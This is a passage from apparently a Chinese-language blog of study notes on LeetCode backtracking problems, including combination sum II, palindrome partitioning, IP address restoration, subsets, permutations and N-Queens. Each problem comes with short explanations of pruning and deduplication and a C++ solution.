<p>因为排序过后连续相同元素,前一个元素的所以情况肯定包含了后一个元素的所有情况,所以后一个元素的情况直接舍弃</p>
<h5 id="set去重"><a href="#set去重" class="headerlink" title="set去重"></a>set去重</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; path;</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">combinationSum2</span>(vector&lt;<span class="keyword">int</span>&gt;&amp; candidates, <span class="keyword">int</span> target) &#123;</span><br><span class="line">        <span class="built_in">sort</span>(candidates.<span class="built_in">begin</span>(), candidates.<span class="built_in">end</span>());</span><br><span class="line">        <span class="built_in">backTracking</span>(candidates, target, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">backTracking</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; candidates, <span class="keyword">int</span> target, <span class="keyword">int</span> startIndex)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sum &gt; target) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (sum == target) &#123;</span><br><span class="line">            res.<span class="built_in">push_back</span>(path);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        unordered_set&lt;<span class="keyword">int</span>&gt; st;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = startIndex; i &lt; candidates.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (st.<span class="built_in">count</span>(candidates[i])) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            st.<span class="built_in">insert</span>(candidates[i]);</span><br><span class="line"></span><br><span class="line">            sum += candidates[i];</span><br><span class="line">            path.<span class="built_in">push_back</span>(candidates[i]);</span><br><span class="line">            <span class="built_in">backTracking</span>(candidates, target, i + <span class="number">1</span>);</span><br><span class="line">            path.<span class="built_in">pop_back</span>();</span><br><span class="line">            sum -= candidates[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h5 id="利用组合的关系去重"><a href="#利用组合的关系去重" class="headerlink" title="利用组合的关系去重"></a>利用组合的关系去重</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; path;</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">combinationSum2</span>(vector&lt;<span class="keyword">int</span>&gt;&amp; candidates, <span class="keyword">int</span> target) &#123;</span><br><span class="line">        <span class="built_in">sort</span>(candidates.<span class="built_in">begin</span>(), candidates.<span class="built_in">end</span>());</span><br><span class="line">        <span class="built_in">backTracking</span>(candidates, target, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">backTracking</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; candidates, <span class="keyword">int</span> target, <span class="keyword">int</span> startIndex)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sum &gt; target) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (sum == target) &#123;</span><br><span class="line">            res.<span class="built_in">push_back</span>(path);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = startIndex; i &lt; candidates.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i &gt; startIndex &amp;&amp; candidates[i] == candidates[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            sum += candidates[i];</span><br><span class="line">            path.<span class="built_in">push_back</span>(candidates[i]);</span><br><span class="line">            <span class="built_in">backTracking</span>(candidates, target, i + <span class="number">1</span>);</span><br><span class="line">            path.<span class="built_in">pop_back</span>();</span><br><span class="line">            sum -= candidates[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="131-分割回文串"><a href="#131-分割回文串" class="headerlink" title="131. 分割回文串"></a><a href="https://leetcode.cn/problems/palindrome-partitioning/">131. 分割回文串</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011128495.png" alt="image-20241001112809427"></p>
<p>本题中startIndex就是每次的切割符,在for循环中检查本次切割是否有效,无效则放弃这条树枝</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202409282052774.png" alt="image-20240928173437573"></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;string&gt; part;</span><br><span class="line">    vector&lt;vector&lt;string&gt;&gt; res;</span><br><span class="line">    vector&lt;vector&lt;string&gt;&gt; <span class="built_in">partition</span>(string s) &#123;</span><br><span class="line">        <span class="built_in">backTracking</span>(s, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">backTracking</span><span class="params">(string s, <span class="keyword">int</span> startIndex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (startIndex == s.<span class="built_in">length</span>()) &#123;</span><br><span class="line">            res.<span class="built_in">push_back</span>(part);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = startIndex; i &lt; s.<span class="built_in">length</span>(); i++) &#123;</span><br><span class="line">            string temp = s.<span class="built_in">substr</span>(startIndex, i - startIndex + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">isValid</span>(temp)) &#123;</span><br><span class="line">                part.<span class="built_in">push_back</span>(temp);</span><br><span class="line">                <span class="built_in">backTracking</span>(s, i + <span class="number">1</span>);</span><br><span class="line">                part.<span class="built_in">pop_back</span>();</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">		</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isValid</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//检查是否有效</span></span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> right = s.<span class="built_in">length</span>() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s[left] != s[right]) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            left++;</span><br><span class="line">            right--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="93-复原-IP-地址"><a href="#93-复原-IP-地址" class="headerlink" title="93. 复原 IP 地址"></a><a href="https://leetcode.cn/problems/restore-ip-addresses/">93. 复原 IP 地址</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011128714.png" alt="image-20241001112818626"></p>
<p>本题算是上一题的升级版,有以下几点需要注意</p>
<ol>
<li>收获结果的条件,一定是最后一次切割在s末尾并且切割了4次才收获</li>
<li>剪枝操作和上一题类似,都是在循环内检查本次切割是否合法,不合法则continue,舍弃当前的一个子树</li>
<li>还有一个剪枝逻辑,就是当已经切割了3次,但是剩下的元素比3个多的时候,不可能组正常的ip地址,则直接break,一次性剪去后面的一堆子树</li>
<li>substr函数的使用</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    string path;</span><br><span class="line">    vector&lt;string&gt; res;</span><br><span class="line">    <span class="keyword">int</span> pointCount = <span class="number">0</span>;</span><br><span class="line">    <span class="function">vector&lt;string&gt; <span class="title">restoreIpAddresses</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">backTracking</span>(s, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">backTracking</span><span class="params">(string s, <span class="keyword">int</span> startIndex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (pointCount &gt; <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (startIndex == s.<span class="built_in">length</span>() &amp;&amp; pointCount == <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="comment">// 把多的一个点去掉</span></span><br><span class="line">            res.<span class="built_in">push_back</span>(path.<span class="built_in">substr</span>(<span class="number">0</span>, path.<span class="built_in">length</span>() - <span class="number">1</span>));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = startIndex; i &lt; s.<span class="built_in">length</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (pointCount == <span class="number">3</span> &amp;&amp; s.<span class="built_in">length</span>() - startIndex &gt; <span class="number">3</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            string temp = s.<span class="built_in">substr</span>(startIndex, i - startIndex + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">isValid</span>(temp)) &#123;</span><br><span class="line">                <span class="keyword">int</span> len = path.<span class="built_in">length</span>();</span><br><span class="line">                path += temp + <span class="string">&quot;.&quot;</span>;</span><br><span class="line">                pointCount++;</span><br><span class="line">                <span class="built_in">backTracking</span>(s, i + <span class="number">1</span>);</span><br><span class="line">                pointCount--;</span><br><span class="line">                path = path.<span class="built_in">substr</span>(<span class="number">0</span>, len);</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isValid</span><span class="params">(string part)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (part.<span class="built_in">size</span>() &gt; <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (part[<span class="number">0</span>] == <span class="string">&#x27;0&#x27;</span> &amp;&amp; part.<span class="built_in">size</span>() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> temp = <span class="built_in">stoi</span>(part);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (temp &gt; <span class="number">255</span> || temp &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="78-子集"><a href="#78-子集" class="headerlink" title="78. 子集"></a><a href="https://leetcode.cn/problems/subsets/">78. 子集</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011128242.png" alt="image-20241001112827160"></p>
<p>这题跟前面不同的地方在于它收获结果不是在叶子结点,而是每一个树枝都收集</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; path;</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">subsets</span>(vector&lt;<span class="keyword">int</span>&gt;&amp; nums) &#123;</span><br><span class="line">        <span class="built_in">backTracking</span>(nums, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">backTracking</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> startIndex)</span> </span>&#123;</span><br><span class="line">        res.<span class="built_in">push_back</span>(path);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = startIndex; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            path.<span class="built_in">push_back</span>(nums[i]);</span><br><span class="line">            <span class="built_in">backTracking</span>(nums, i + <span class="number">1</span>);</span><br><span class="line">            path.<span class="built_in">pop_back</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="90-子集-II"><a href="#90-子集-II" class="headerlink" title="90. 子集 II"></a><a href="https://leetcode.cn/problems/subsets-ii/">90. 子集 II</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011128247.png" alt="image-20241001112834170"></p>
<p>本题跟上一题多了一个树层去重的逻辑,先排序,排序好后数值相同的元素会相邻,同一层内,相邻元素的第一个的情况肯定会包含后面几个的情况</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; path;</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">subsetsWithDup</span>(vector&lt;<span class="keyword">int</span>&gt;&amp; nums) &#123;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="built_in">backTracking</span>(nums, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">backTracking</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> startIndex)</span> </span>&#123;</span><br><span class="line">        res.<span class="built_in">push_back</span>(path);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = startIndex; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i &gt; startIndex &amp;&amp; nums[i] == nums[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            path.<span class="built_in">push_back</span>(nums[i]);</span><br><span class="line">            <span class="built_in">backTracking</span>(nums, i + <span class="number">1</span>);</span><br><span class="line">            path.<span class="built_in">pop_back</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="491-非递减子序列"><a href="#491-非递减子序列" class="headerlink" title="491. 非递减子序列"></a><a href="https://leetcode.cn/problems/non-decreasing-subsequences/">491. 非递减子序列</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011128377.png" alt="image-20241001112841292"></p>
<p>本题依然还是树层去重,但是它不是有序的数组,所以只能用set</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; path;</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">findSubsequences</span>(vector&lt;<span class="keyword">int</span>&gt;&amp; nums) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">backTracking</span>(nums, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">backTracking</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> startIndex)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (path.<span class="built_in">size</span>() &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">            res.<span class="built_in">push_back</span>(path);</span><br><span class="line">        &#125;</span><br><span class="line">        unordered_set&lt;<span class="keyword">int</span>&gt; st;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = startIndex; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (st.<span class="built_in">count</span>(nums[i])) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (path.<span class="built_in">size</span>() &gt; <span class="number">0</span> &amp;&amp; path[path.<span class="built_in">size</span>() - <span class="number">1</span>] &gt; nums[i]) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            st.<span class="built_in">insert</span>(nums[i]);</span><br><span class="line">            path.<span class="built_in">push_back</span>(nums[i]);</span><br><span class="line">            <span class="built_in">backTracking</span>(nums, i + <span class="number">1</span>);</span><br><span class="line">            path.<span class="built_in">pop_back</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="46-全排列"><a href="#46-全排列" class="headerlink" title="46. 全排列"></a><a href="https://leetcode.cn/problems/permutations/">46. 全排列</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011128455.png" alt="image-20241001112849368"></p>
<p>全排列就是典型的树枝去重,每一层都从头开始,但是上面层已经用过的元素不能再用</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; path;</span><br><span class="line"></span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">permute</span>(vector&lt;<span class="keyword">int</span>&gt;&amp; nums) &#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">used</span><span class="params">(nums.size(), <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="built_in">backTracking</span>(nums, used);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">backTracking</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, vector&lt;<span class="keyword">int</span>&gt;&amp; used)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (path.<span class="built_in">size</span>() == nums.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            res.<span class="built_in">push_back</span>(path);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (used[i] != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            used[i] = <span class="number">1</span>;</span><br><span class="line">            path.<span class="built_in">push_back</span>(nums[i]);</span><br><span class="line">            <span class="built_in">backTracking</span>(nums, used);</span><br><span class="line">            path.<span class="built_in">pop_back</span>();</span><br><span class="line">            used[i] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="47-全排列-II"><a href="#47-全排列-II" class="headerlink" title="47. 全排列 II"></a><a href="https://leetcode.cn/problems/permutations-ii/">47. 全排列 II</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011128576.png" alt="image-20241001112856488"></p>
<p><strong>树枝去重+树层去重</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; path;</span><br><span class="line"></span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">permuteUnique</span>(vector&lt;<span class="keyword">int</span>&gt;&amp; nums) &#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">used</span><span class="params">(nums.size(), <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="built_in">backTracking</span>(nums, used);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">backTracking</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, vector&lt;<span class="keyword">int</span>&gt;&amp; used)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (path.<span class="built_in">size</span>() == nums.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            res.<span class="built_in">push_back</span>(path);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        unordered_set&lt;<span class="keyword">int</span>&gt; st;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (used[i] != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(st.<span class="built_in">count</span>(nums[i]))&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            st.<span class="built_in">insert</span>(nums[i]);</span><br><span class="line">            used[i] = <span class="number">1</span>;</span><br><span class="line">            path.<span class="built_in">push_back</span>(nums[i]);</span><br><span class="line">            <span class="built_in">backTracking</span>(nums, used);</span><br><span class="line">            path.<span class="built_in">pop_back</span>();</span><br><span class="line">            used[i] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="51-N-皇后"><a href="#51-N-皇后" class="headerlink" title="51. N 皇后"></a><a href="https://leetcode.cn/problems/n-queens/">51. N 皇后</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202409291058248.png" alt="image-20240929105827138"></p>
<p>这题的思路就是按照每次放的列来形成递归树的分支,然后逐层放置一个皇后每次放完都检查是否有效,有效则去往下一层,无效则换下一列放置,最后放完n层的就是结果,收获即可</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;string&gt;&gt; res;</span><br><span class="line"></span><br><span class="line">    vector&lt;vector&lt;string&gt;&gt; <span class="built_in">solveNQueens</span>(<span class="keyword">int</span> n) &#123;</span><br><span class="line">        string temp = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            temp += <span class="string">&quot;.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function">vector&lt;string&gt; <span class="title">board</span><span class="params">(n, temp)</span></span>;</span><br><span class="line">        <span class="built_in">backTracking</span>(board, n, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">backTracking</span><span class="params">(vector&lt;string&gt;&amp; board, <span class="keyword">int</span> n, <span class="keyword">int</span> row)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (row == n) &#123;</span><br><span class="line">            res.<span class="built_in">push_back</span>(board);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">            board[row][j] = <span class="string">&#x27;Q&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">isValid</span>(board, row, j)) &#123;</span><br><span class="line">                <span class="built_in">backTracking</span>(board, n, row + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            board[row][j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isValid</span><span class="params">(vector&lt;string&gt; curBoard, <span class="keyword">int</span> row, <span class="keyword">int</span> col)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 同一行不用检查,因为是当前行有效之后才放下一行的元素</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检查同一列,只检查前面的就行</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = row - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (curBoard[i][col] == <span class="string">&#x27;Q&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检查左对角线</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = row - <span class="number">1</span>, j = col - <span class="number">1</span>; i &gt;= <span class="number">0</span> &amp;&amp; j &gt;= <span class="number">0</span>; i--, j--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (curBoard[i][j] == <span class="string">&#x27;Q&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检查右对角线</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = row - <span class="number">1</span>, j = col + <span class="number">1</span>; i &gt;= <span class="number">0</span> &amp;&amp; j &lt; curBoard.<span class="built_in">size</span>();</span><br><span class="line">             i--, j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (curBoard[i][j] == <span class="string">&#x27;Q&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="37-解数独"><a href="#37-解数独" class="headerlink" title="37. 解数独"></a><a href="https://leetcode.cn/problems/sudoku-solver/">37. 解数独</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202409291150147.png" alt="image-20240929115023023"></p>
<p>本题的难点在于</p>
<ol>
<li>找到一个答案就立刻返回的逻辑</li>
<li>它是逐个填写单元格,所以对棋盘的遍历需要两个for循环,其中填写数字还需要再来一个for循环</li>
